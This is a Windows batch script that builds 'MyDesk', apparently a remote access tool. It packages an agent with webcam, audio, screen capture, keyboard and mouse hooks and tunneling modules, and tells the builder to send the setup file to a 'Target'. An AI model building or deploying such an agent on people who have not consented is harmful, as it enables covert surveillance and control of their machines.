@echo off
setlocal
cd /d "%~dp0.."

echo ==========================================
echo       MyDesk BUILD SYSTEM (Optimized)
echo ==========================================

:: 1. Cleanup (keep spec file for faster rebuilds)
if exist dist rmdir /s /q dist
@REM if exist build rmdir /s /q build
mkdir dist

:: 2. Dependencies (numpy, msgpack for optimizations)
echo [*] Checking Dependencies...
:: python -m pip install pyinstaller dxcam pynput pillow websockets PyQt6 opencv-python pyaudio mss numpy msgpack zstandard >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Failed to install dependencies!
    pause
    exit /b
)

:: 3. Custom Config Check
echo.
echo [*] Checking Pre-Baked Config...
echo    If you haven't edited "scripts/install_agent.py" with your URLs,
echo    the Intent will prompt the user (Interactive Mode).
echo.

:: 4. Build AGENT (Optimized - uses --noupx for faster build)
echo [*] Building 1/3: MyDeskAgent.exe...
python -m PyInstaller --console --onefile --noupx --name MyDeskAgent ^
    --exclude-module matplotlib ^
    --exclude-module pandas ^
    --exclude-module scipy ^
    --exclude-module PyQt6 ^
    --exclude-module torch ^
    --exclude-module streamlit ^
    --exclude-module altair ^
    --exclude-module flask ^
    --exclude-module selenium ^
    --exclude-module sklearn ^
    --exclude-module pyarrow ^
    --exclude-module ipython ^
    --exclude-module jupyter ^
    --exclude-module chess ^
    --exclude-module google ^
    --exclude-module pywinauto ^
    --exclude-module uiautomation ^
    --exclude-module nodriver ^
    --hidden-import=target.input_controller ^
    --hidden-import=target.privacy ^
    --hidden-import=target.capture ^
    --hidden-import=target.audio ^
    --hidden-import=target.webcam ^
    --hidden-import=target.auditor ^
    --hidden-import=pynput.keyboard._win32 ^
    --hidden-import=pynput.mouse._win32 ^
    --hidden-import=numpy ^
    --hidden-import=msgpack ^
    --hidden-import=PIL.Image ^
    --hidden-import=cv2 ^
    --hidden-import=requests ^
    --hidden-import=target.tunnel_manager ^
    --add-data "target;target" ^
    agent_loader.py
if %errorlevel% neq 0 goto fail

:: 5. Build SETUP (Bundle) - Uncomment when needed
@REM echo.
@REM echo [*] Building 2/3: MyDeskSetup.exe (Installer Bundle)...
@REM python -m PyInstaller --noconsole --onefile --noupx --name MyDeskSetup --add-binary "dist/MyDeskAgent.exe;." scripts/install_agent.py
@REM if %errorlevel% neq 0 goto fail

:: 6. Build VIEWER - Uncomment when needed
@REM echo.
@REM echo [*] Building 3/3: MyDeskViewer.exe (Client App)...
@REM python -m PyInstaller --noconsole --onefile --noupx --name MyDeskViewer ^
@REM     --hidden-import=PyQt6.QtCore ^
@REM     --hidden-import=PyQt6.QtGui ^
@REM     --hidden-import=PyQt6.QtWidgets ^
@REM     viewer/main.py
@REM if %errorlevel% neq 0 goto fail

echo.
echo ==========================================
echo         BUILD COMPLETE!
echo ==========================================
echo Output Files (in \MyDesk\dist):
echo 1. MyDeskSetup.exe  (Send this to Target)
echo 2. MyDeskViewer.exe (Run this on your PC)
echo.
@REM pause
exit /b

:fail
echo.
echo [!] BUILD FAILED. Check errors above.
pause
exit /b
